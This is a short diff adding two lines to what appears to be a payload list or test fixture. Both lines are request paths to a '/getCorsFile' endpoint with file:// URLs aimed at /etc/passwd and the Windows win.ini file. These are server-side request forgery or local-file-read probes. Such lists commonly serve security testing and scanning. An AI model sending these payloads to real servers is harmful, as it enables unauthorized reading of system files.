@@ -1,0 +1,2 @@
+/getCorsFile?urlPath=file:///etc/passwd
+/getCorsFile?urlPath=file:///c://windows/win.ini
